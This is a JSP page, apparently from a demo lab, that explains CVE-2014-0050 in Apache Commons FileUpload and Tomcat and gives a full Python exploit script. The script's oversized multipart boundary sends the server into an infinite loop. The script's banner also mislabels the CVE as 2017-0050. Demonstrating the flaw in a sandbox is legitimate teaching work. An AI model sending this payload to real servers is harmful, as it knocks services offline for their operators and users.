<%@ taglib prefix="s" uri="/struts-tags" %>
<html>

<body>
	<h1>CVE-2014-0050 : Apache Commons FileUpload and Apache Tomcat DoS</h1>
	<br>
	This application demonstrates CVE-2014-0050 vulnerability <br>
	DISCLAIMER : the exploitation of this vulnerability leads to infinite loop and CPU consumption. <br>
	Uses this site on sand-boxed environment.
	<ol>
		<li>Start the application</li>
		<li>Create the exploit.py script on the attacker machine (see below)</li>
		<li>Run the script : python exploit.py http://localhost:8080/readme</li>
		<li>Monitor the CPU usage on the server :-)</li>
	</ol>
	
	<h2>exploit.py</h2>
	<pre>
#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib


def exploit(url):
    boundary = '0'*4092
    payload = "multipart/form-data; boundary="
    payload += boundary

    data = (boundary + '00000')

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload, 'Content-Length': '4097'}
        request = urllib2.Request(url, headers=headers, data=data)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] exploit.py <url>")
    else:
        print('[*] CVE: 2017-0050 - Apache Commons FileUpload and Apache Tomcat DoS')
        url = sys.argv[1]
        exploit(url)
	</pre>
</body>
</html>